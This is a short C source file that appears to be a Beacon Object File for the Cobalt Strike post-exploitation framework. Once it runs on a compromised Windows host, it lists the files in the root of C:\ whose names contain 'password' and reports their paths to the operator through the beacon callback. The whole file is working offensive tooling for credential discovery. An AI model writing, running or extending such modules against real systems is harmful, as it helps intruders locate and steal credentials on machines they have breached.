#include "beacon.h"

DECLSPEC_IMPORT BOOL WINAPI FindNextFileA(HANDLE, LPWIN32_FIND_DATAA);
DECLSPEC_IMPORT HANDLE WINAPI FindFirstFileA(LPCSTR, LPWIN32_FIND_DATAA);
DECLSPEC_IMPORT BOOL WINAPI FindClose(HANDLE);

void go(char* args, int len) {
    WIN32_FIND_DATAA ffd;
    HANDLE hFind = INVALID_HANDLE_VALUE;
    char szDir[MAX_PATH];
    char* str = "password";

    BeaconPrintf(CALLBACK_OUTPUT, "Searching for files with '%s' in the name...\n", str);

    hFind = FindFirstFileA("C:\\*", &ffd);
    if (hFind == INVALID_HANDLE_VALUE) {
        BeaconPrintf(CALLBACK_OUTPUT, "Failed to find first file: %lu\n", GetLastError());
        return;
    }

    do {
        if (strstr(ffd.cFileName, str) != NULL) {
            _snprintf(szDir, MAX_PATH, "C:\\%s", ffd.cFileName);
            BeaconPrintf(CALLBACK_OUTPUT, "%s\n", szDir);
        }
    } while (FindNextFileA(hFind, &ffd) != 0);

    FindClose(hFind);
    BeaconPrintf(CALLBACK_OUTPUT, "Finished searching.\n");
}
